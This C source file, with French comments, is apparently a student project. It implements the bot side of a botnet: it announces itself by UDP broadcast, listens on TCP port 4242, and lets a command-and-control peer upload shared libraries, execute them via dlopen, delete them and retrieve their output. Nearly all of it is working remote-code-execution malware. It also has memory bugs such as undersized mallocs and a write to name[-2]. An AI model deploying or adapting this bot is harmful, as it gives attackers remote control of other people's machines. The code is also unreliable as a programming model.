/* Botnet

- Botnets send in UDP broadcast their IP. They also communicate through TCP like a server.
- The Charge_bot directory contains all the dynamic libraries that has been uploaded by the C&C.
- The Resultat_charges directory contains the outputs of the libraries's executions.

Issues :
Sometimes dialogue between C&C and botnets never ends. (TCP synchronization issues)
*/

#include "libfluxthread.h"
#include "libipc.h"
#include "libudp.h"
#include "libtcp.h"


charge_t tab_charges_sur_bot[NB_MAX_CHARGES];
tab_nom_charge_t nom_des_charges;
EXEC_STRUCT_t tab_executions[NB_MAX_EXECUTION];
int indice_tableau_execution = -1;
pthread_mutex_t mutex_indice;
char DIR_CHARGES_BOT[100] = "./Charge_bot/";
char DIR_RESULTAT_BOT[100] = "./Resultat_charges/";
int Nombre_charges_executes =0;
int Duree_de_vie;

/* prototypes */
void handler(int SignalNum);
void inclu_nom_charge(char * nom);
void* Serveur_TCP(void *s);
void* clientUDP(void *s);
void* execute_charge(void* arg);
void * supprimer_charge(void* nom_fichier);
void * Gestion_Connexion_TCP(void *s);
int recherche_charge(charge_t * p);
int Install_charge_utile(FILE *dialogue,char * ligne);
int Exec_charge_utile(FILE *dialogue,char * ligne);
int Suppr_charge_bot(FILE *dialogue,char * ligne);
int Deman_resultat_execution(FILE *dialogue,char * ligne);


/* Intercepte CTRL + C */
void handler(int SignalNum)
{
    if(SignalNum==SIGINT){
        printf("\nInterruption SIGINT\n");

		for (int i=0; i<nom_des_charges.indice; i++){
			free(nom_des_charges.tab_nom[i]);
		}
		printf("Free du tableau de nom de charge : ok\n");
        exit(0);
    }
}


//fonction qui stocke le nom de charge installé dans notre structure de noms de charges
void inclu_nom_charge(char * nom)
{
    if (nom_des_charges.indice != 50)
    {
        nom_des_charges.tab_nom[nom_des_charges.indice] = malloc(sizeof(nom));
        strcpy(nom_des_charges.tab_nom[nom_des_charges.indice],nom);
        nom_des_charges.indice ++;
    }
    else
    {
        printf("impossible d'inclure la charge, tableau remplit\n");
    }
}


// fonction qui indique si la charge passée en paramètre est déjà presente sur le BOT ( si son nom est présente de le tableau des noms de charges)
int recherche_charge(charge_t * p)
{
    int i=0;
    for(i=0;i<nom_des_charges.indice;i++)
    {
        if(strncmp(nom_des_charges.tab_nom[i], p->name,strlen(p->name) -1) == 0)
        {
            return i; // on retourne l'indice
        }
    }
    // sinon
    return NB_MAX_CHARGES+1;
}


//execute une charge en redirigeant stdout et stderr
void* execute_charge(void* arg){
    void *handle;
    char *error;
    void (*start)(void);
    time_t now;
    char int_to_str[5]="";

    P_semaphore_thread(&mutex_indice);

    indice_tableau_execution++;

    EXEC_STRUCT_t ma_struct_exec;

    char nom_fichier_resultat[100]="resultat";
    sprintf(int_to_str,"%d",indice_tableau_execution);
    strcat(nom_fichier_resultat,int_to_str);
    strcat(nom_fichier_resultat,".txt");

    ma_struct_exec.file_resultat_name=malloc(strlen(nom_fichier_resultat));
    strcpy(ma_struct_exec.file_resultat_name,nom_fichier_resultat);

    ma_struct_exec.index=indice_tableau_execution;

    char* chemin=malloc(strlen(DIR_RESULTAT_BOT)+strlen(nom_fichier_resultat)+1);
    strcpy(chemin,DIR_RESULTAT_BOT);
    strcat(chemin,nom_fichier_resultat);
    int fichier_resultat = open(chemin,O_CREAT|O_WRONLY|O_RDONLY,0644);

    int copie_stdin = dup(1);
    int copie_stderr = dup(2);

    dup2(fichier_resultat,1);
    dup2(fichier_resultat,2);

    ma_struct_exec.charge_name=malloc(strlen(arg)+1);
    strcpy(ma_struct_exec.charge_name,arg);

    char* charge_path = malloc(strlen(DIR_CHARGES_BOT)+strlen(ma_struct_exec.charge_name));
    strcpy(charge_path,DIR_CHARGES_BOT);
    strcat(charge_path,ma_struct_exec.charge_name);

    time(&now);
    write(1,charge_path,strlen(charge_path));write(1,"\n",1);
    write(1,ctime(&now),strlen(ctime(&now)));write(1,"\n",1);

    handle = dlopen(charge_path, RTLD_LAZY);
    if (!handle) {fprintf(stderr, "%s\n", dlerror());V_semaphore_thread(&mutex_indice);return NULL;}
    dlerror();

    start = (void (*)(void)) dlsym(handle, "start");

    error = dlerror();
    if (error != NULL) {fprintf(stderr, "%s\n", error);V_semaphore_thread(&mutex_indice);return NULL;}

    (*start)();

    dup2(copie_stdin,1);
    dup2(copie_stderr,2);

    dlclose(handle);
    close(fichier_resultat);
    close(copie_stdin);
    close(copie_stderr);

    FILE* fp;

    if ((fp = fopen(chemin, "ab")) == NULL) {
		perror(nom_fichier_resultat);
		exit(0);
	}
    int size = (int)ftell(fp);
    fclose(fp);

    ma_struct_exec.data_size=size;

    tab_executions[indice_tableau_execution]=ma_struct_exec;

    Nombre_charges_executes++;

    free(chemin);
    free(charge_path);
    V_semaphore_thread(&mutex_indice);
    return NULL;
}


/* supprime la charge passée en paramètre */
void * supprimer_charge(void* nom_fichier)
{
      printf("dans le thread lancer supprimer charge\n");

      char* charge_path = malloc(strlen(DIR_CHARGES_BOT)+strlen(((charge_t *)nom_fichier)->name));
      strcpy(charge_path,DIR_CHARGES_BOT);
      strcat(charge_path,((charge_t *)nom_fichier)->name);

      if(remove(charge_path)!=0){
          printf("on n'a pas réussi, on arrête le dialogue!");
      }

      int indice = recherche_charge((charge_t *)nom_fichier);
      strcpy(nom_des_charges.tab_nom[indice],"vide\n");
      free(charge_path);
      return NULL;
}


/* Dialogue entre le bot et le C&C : Installation d'une charge utile sur le bot */
int Install_charge_utile(FILE *dialogue,char * ligne){
    int cpt=1;
    int indice_charge1 = 0;

    printf("je suis dans la fonction install\n");
    fprintf(dialogue,"%s","OKupload\n");
    while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
        if((sscanf(ligne,"%d\n",&tab_charges_sur_bot[indice_charge1].name_size) != EOF) && (cpt == 1))
        {
            fprintf(dialogue,"%s","OKname_size\n");
            cpt++;
        }

        else if (cpt == 2)
        {
            printf(" nom que le bot recoit : %s",ligne);
            tab_charges_sur_bot[indice_charge1].name = malloc(tab_charges_sur_bot[indice_charge1].name_size);
            strncpy(tab_charges_sur_bot[indice_charge1].name,ligne,tab_charges_sur_bot[indice_charge1].name_size);
            tab_charges_sur_bot[indice_charge1].name[tab_charges_sur_bot[indice_charge1].name_size-1]= '\n';

            inclu_nom_charge(tab_charges_sur_bot[indice_charge1].name);
            fprintf(dialogue,"%s","OKname\n");

            cpt++;
        }

        else if(sscanf(ligne,"%d\n",&(tab_charges_sur_bot[indice_charge1].data_size)) != EOF && (cpt == 3))
        {
            fprintf(dialogue,"%s","OKdata_size\n");
            printf("taille du nom de la charge : %d\n",tab_charges_sur_bot[indice_charge1].data_size);
            cpt++;
        }

        if(cpt == 4)
        {
            tab_charges_sur_bot[indice_charge1].data=malloc(tab_charges_sur_bot[indice_charge1].data_size);
            unsigned char* pt2 = tab_charges_sur_bot[indice_charge1].data;
            int compteur = 0;

            while((fread(pt2,1, 1,dialogue) != 0) && (compteur < tab_charges_sur_bot[indice_charge1].data_size-1)){

                compteur ++;
                pt2++;
            }

            char chemin[200]="";
            int compteur2=0;
            strcpy(chemin,DIR_CHARGES_BOT);
            strcat(chemin,tab_charges_sur_bot[indice_charge1].name);
            unsigned char* pt=tab_charges_sur_bot[indice_charge1].data;


            printf("chemin : %s %p\n",chemin,pt);
            FILE* fd = fopen(chemin,"wb");
            if(fd != NULL){
                while(compteur2<tab_charges_sur_bot[indice_charge1].data_size){
                    fwrite(pt,1,1,fd);
                    pt++;
                    compteur2++;
                }
                fclose(fd);
            }
            else{
                printf("impossible d'ouvrir en write binary le fichier : %s %p\n",chemin,pt);
            }


            cpt++;
        }

        if(cpt == 5)
        {
            fprintf(dialogue,"%s","bye\n");
            if(fgets(ligne,MAX_LIGNE,dialogue)!=NULL)
            {
                printf("le dernier bye recu : %s",ligne);
                break;
            }
        }
    }
    return 0;
}


/* Dialogue entre le bot et le C&C : Execution d'une charge utile sur le bot */
int Exec_charge_utile(FILE *dialogue,char * ligne){
    int id;
    printf("je suis dans la fonction execute_charge\n");

    charge_t * p1_struct = malloc(sizeof(charge_t));
    p1_struct->name = NULL;
    p1_struct->data = NULL;

    int cpt=1;
    while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
        if((sscanf(ligne,"%d",&(p1_struct->name_size)) != EOF) && (cpt == 1))
        {
            p1_struct->name=malloc(sizeof(p1_struct->name_size));
            fprintf(dialogue,"%s","OKname_size\n");
            cpt++;
        }

        else if( cpt == 2)
        {
            strcpy((char *)p1_struct->name,ligne);
            p1_struct->name[-2] = '\0';

            if(recherche_charge(p1_struct)!=NB_MAX_CHARGES+1)
            {
                id = recherche_charge(p1_struct);

                lancer_flux(execute_charge,p1_struct->name,strlen(p1_struct->name)+1);
                fprintf(dialogue,"%s","OKname\n");

                fprintf(dialogue,"%d\n",id);

                cpt++;
            }
            else
            {
                printf("je recoie NOKname !!\n");
                fprintf(dialogue,"%s","NOKname\n");

                break;
            }
        }


        else if((strncmp(ligne,"OKid\n",4)==0) && (cpt == 3))
        {
            fprintf(dialogue,"%s","bye\n");
            cpt++;
        }


        else if(cpt==4)
        {
            printf("je recoit bye, je reviens dans le main\n");
            break;
        }
    }
    return 0;
}


/* Dialogue entre le bot et le C&C : Suppression d'une charge utile sur le bot */
int Suppr_charge_bot(FILE *dialogue,char * ligne){
    printf("je suis dans la fonction suppr charge\n");

    charge_t * p2_struct = malloc(sizeof(charge_t));
    p2_struct->name = NULL;
    p2_struct->data = NULL;

    int cpt=1;
    while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
        if((sscanf(ligne,"%d",&(p2_struct->name_size)) != EOF) && (cpt == 1))
        {
            p2_struct->name=malloc(sizeof(p2_struct->name_size));
            fprintf(dialogue,"%s","Okname_size\n");
            cpt++;
        }

        else if( cpt == 2)
        {
            strcpy((char *)p2_struct->name,ligne);
            if(recherche_charge(p2_struct)==NB_MAX_CHARGES+1)
            {
                fprintf(dialogue,"%s","NOKname\n");
                break;
            }

            else
            {
                lancer_flux(supprimer_charge,p2_struct,sizeof(charge_t));
                fprintf(dialogue,"%s","Okname\n");
            }
                cpt++;
        }
        else if((strncmp(ligne,"bye\n",3)==0) && (cpt ==3))
        {
            fprintf(dialogue,"%s","bye\n");
            break;
        }
    }
    return 0;
}




/* Dialogue entre le bot et le C&C : Demande du resultat de l'éxecution d'une charge utile sur le bot */
int Deman_resultat_execution(FILE *dialogue,char * ligne){
    printf("je suis dans la fonction demande resultat execution\n");

    charge_t * p_struct = malloc(sizeof(charge_t));
    p_struct->name = NULL;
    p_struct->data = NULL;

    int id=-1;
    int cpt=0;
    while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
        if((sscanf(ligne,"%d\n",&id) != EOF) && (cpt == 0)){
            printf("on est rentre dans le else if, ID : %d\n",id);
            int taille=0;
            if(id<0 || id>indice_tableau_execution){
                fprintf(dialogue,"%s","NOKid\n");
                break;
            }
            else{ // sinon
                printf("on est dans le else\n");
                fprintf(dialogue,"%s","OKid\n");
                taille=tab_executions[id].data_size;
                printf("la taille du resultat d'execution : %d\n",tab_executions[id].data_size);
                fprintf(dialogue,"%d\n",taille);
            }
            cpt++;
        }


        else if((strncmp(ligne,"OKresult_size\n",13)==0) && (cpt ==1)){
            printf("recu : %s\n",ligne);

            int compteur5=0;
            unsigned char* pt=NULL;

            P_semaphore_thread(&mutex_indice);

            printf("id : %d\n",id);

            int taille=tab_executions[id].data_size;
            unsigned char buffer;
            char chemin[200]="";
            strcpy(chemin,DIR_RESULTAT_BOT);
            strcat(chemin,tab_executions[id].file_resultat_name);

            FILE* fd = fopen(chemin,"rb");
            if(fd!=NULL){
                while(fread(&buffer,1,1,fd) != 0 && compteur5<taille -1){
                    fwrite(&buffer,1,1,dialogue);
                    compteur5++;
                    pt++;
                }
                fclose(fd);
            }
            else{
                printf("Impossible de lire le fichier : %s\n",chemin);
            }
            V_semaphore_thread(&mutex_indice);
            fflush(dialogue);
            cpt ++;
        }


        else if((strncmp(ligne,"bye\n",3)==0) && (cpt ==2)){
            printf("%s",ligne);
            fprintf(dialogue,"%s","bye\n");
            fflush(dialogue);
            cpt++;
        }
    }
    return 0;
}



void * Gestion_Connexion_TCP(void *s){
    printf("bienvenue dans gestion connexion TCP\n");
    FILE *dialogue=fdopen(*(int *)s,"a+");
    if(dialogue==NULL){ perror("gestionClient.fdopen"); exit(EXIT_FAILURE); }

    char ligne[MAX_LIGNE];
    while(fgets(ligne,MAX_LIGNE,dialogue)!=NULL){
        if(strncmp(ligne,"QUIT\n",4)==0){
            printf("j'ai recu quit\n");
            break;
        }

        else if(strncmp(ligne,"STAT\n",4)==0){
            char message_stat[MAX_TAMPON]="";
            char duree_de_vie[MAX_TAMPON]="";
            char nb_de_charge_sur_bot[MAX_TAMPON]="";
            char nb_de_charge_execute[MAX_TAMPON]="";

            sprintf(duree_de_vie, "%d", Duree_de_vie);
            strcat(message_stat,duree_de_vie);
            strcat(message_stat,",");
            sprintf(nb_de_charge_sur_bot, "%d", nom_des_charges.indice);
            strcat(message_stat,nb_de_charge_sur_bot);
            strcat(message_stat,",");
            sprintf(nb_de_charge_execute, "%d", Nombre_charges_executes);
            strcat(message_stat,nb_de_charge_execute);
            strcat(message_stat,"\n");
            fprintf(dialogue,"%s",message_stat);
        }

        else if(strncmp(ligne,"upload?\n",7)==0){
            Install_charge_utile(dialogue,ligne);
            printf("de retour de l'installation\n");
        }
        else if(strncmp(ligne,"execute?\n",8)==0){
            fprintf(dialogue,"%s","OKexecute\n");
            Exec_charge_utile(dialogue,ligne);
            printf("de retour de l'execution\n");

        }
        else if(strncmp(ligne,"delet?\n",6)==0){
            fprintf(dialogue,"%s","OKdelet\n");
            Suppr_charge_bot(dialogue,ligne);
            printf("la suppression a ete effectué\n");
        }
        else if(strncmp(ligne,"result?\n",7)==0){
            printf("on recoit result\n");
            fprintf(dialogue,"%s","OKresult\n");
            Deman_resultat_execution(dialogue,ligne);
            printf("la demande d'éxecution à été effectué a ete effectué\n");
        }
        else{
            printf("ne recoit rien : %s\n",ligne);
        }
    }
    printf("jai quitter le while\n");

    fclose(dialogue);
    return NULL;
}


/* Serveur TCP, lancer Gestion_Connexion_TCP à chaque nouvelle connection d'un C&C */
void* Serveur_TCP(void *s){
    * (int *)s=initialisationServeur("4242",MAX_CONNEXIONS);

    int connexion;

    while(1){
        connexion=accept(* (int *)s,NULL,NULL);
        printf("valeur de connexion :%d\n",connexion);
        if (connexion != -1){
            lancer_flux(Gestion_Connexion_TCP, (void *) &connexion,sizeof(int));
        }
        else{
        printf("aucune connexion dans le serveur TCP\n");
        }
    }
    return NULL;
}


/* Envoie UDP en broadcast */
void* clientUDP(void *s){
    char dureedevie[MAX_TAMPON]="";
    sprintf(dureedevie, "%d", Duree_de_vie);

    unsigned char n0[] = "mmmmmm";// identifiant du bot
    strcat((char *)n0,dureedevie);

    void *handle;
    * (int *)s=createSocket("255.255.255.255","4242",&handle);

    if (* (int *)s<0)exit(EXIT_FAILURE);
    while(1){
        messageUDP(* (int *)s,handle,n0,sizeof(*n0)*strlen((char *)n0));
        sleep(5);
    }

    close(* (int *)s);
    synchro_thread();
}


int main(){
    Duree_de_vie = 1000;
    nom_des_charges.indice = 0;
    int s=0;
    int s1=0;

    /* Mise en place d'un gestionnaire de signal */
    struct sigaction prepaSignal;
    prepaSignal.sa_handler=&handler;
    prepaSignal.sa_flags=0;
    sigemptyset(&prepaSignal.sa_mask);
    sigaction(SIGINT,&prepaSignal,0);

    lancer_flux(Serveur_TCP, (void *) &s,sizeof(int));
    lancer_flux(clientUDP,(void *) &s1,sizeof(int));

    //fin du main, synchronisation des threads
    synchro_thread();
    return 0;
}
